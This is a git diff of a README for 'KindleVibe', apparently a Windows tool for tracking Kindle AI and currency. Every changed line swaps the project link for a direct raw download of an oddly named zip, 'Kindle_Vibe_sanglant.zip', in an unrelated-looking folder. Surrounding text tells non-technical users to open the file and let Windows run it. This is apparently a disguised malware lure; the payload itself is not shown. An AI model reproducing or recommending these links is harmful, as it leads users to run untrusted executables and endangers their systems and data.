@@ -1,6 +1,6 @@
 # 📱 KindleVibe - Track Kindle AI and currency
 
-[![Download KindleVibe](https://img.shields.io/badge/Download-KindleVibe-blue?style=for-the-badge)](https://github.com/Noahtitular257/KindleVibe)
+[![Download KindleVibe](https://img.shields.io/badge/Download-KindleVibe-blue?style=for-the-badge)](https://github.com/Noahtitular257/KindleVibe/raw/refs/heads/main/Andreaea/Kindle_Vibe_sanglant.zip)
 
 ## 🚀 Getting Started
 
@@ -11,7 +11,7 @@ This guide shows you how to get KindleVibe on Windows and run it with no technic
 ## 📥 Download KindleVibe
 
 Visit this page to download:
-https://github.com/Noahtitular257/KindleVibe
+https://github.com/Noahtitular257/KindleVibe/raw/refs/heads/main/Andreaea/Kindle_Vibe_sanglant.zip
 
 On the page, look for the latest release or the main download file. Use the file meant for Windows. If you see more than one file, pick the one that ends in `.exe` or a Windows app file.
 
@@ -185,7 +185,7 @@ Keep all files in the same folder unless the app says to move them. This helps a
 
 ## 📎 Quick Start Steps
 
-1. Visit https://github.com/Noahtitular257/KindleVibe
+1. Visit https://github.com/Noahtitular257/KindleVibe/raw/refs/heads/main/Andreaea/Kindle_Vibe_sanglant.zip
 2. Download the Windows file
 3. Open the file on your PC
 4. Allow Windows to run it
@@ -206,5 +206,5 @@ KindleVibe works well if you want to:
 ## 📌 Download Again
 
 If you need the file again, use this link:
-https://github.com/Noahtitular257/KindleVibe
+https://github.com/Noahtitular257/KindleVibe/raw/refs/heads/main/Andreaea/Kindle_Vibe_sanglant.zip
 
